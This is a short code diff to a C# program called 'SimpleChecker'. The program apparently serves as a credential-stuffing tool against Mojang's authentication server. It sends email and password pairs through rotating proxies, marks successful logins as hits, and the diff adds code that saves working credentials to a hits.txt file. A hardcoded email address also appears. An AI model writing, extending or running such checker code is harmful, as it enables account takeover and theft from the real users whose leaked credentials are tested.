@@ -32,8 +32,8 @@ namespace SimpleChecker
                 //open connection
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://authserver.mojang.com/authenticate");
                 request.Method = "POST";
-                request.Proxy = new WebProxy(proxy, true); //connect through random proxy
-                request.Timeout = 5; //set proxy alive time
+                // request.Proxy = new WebProxy(proxy, true); //connect through random proxy
+                // request.Timeout = 5; //set proxy alive time
 
                 //set payload
                 name = "mijaj50792@ualmail.com";
@@ -57,7 +57,11 @@ namespace SimpleChecker
                     result = rdr.ReadToEnd();
                 }
                 Console.ForegroundColor  = ConsoleColor.Green;
-                string hit = string.Format("[Hit!]\t"+ proxy+"\t"+name+":"+pwd);
+                Console.WriteLine("[Hit!]\t"+ proxy+"\t"+name+":"+pwd);
+                using(StreamWriter file = File.AppendText("hits.txt"))
+                {
+                    file.WriteLine(name+":"+pwd); // apend to hits.txtt
+                }
 
             }
             catch(System.Net.WebException e)//if the remote server return an unauth response
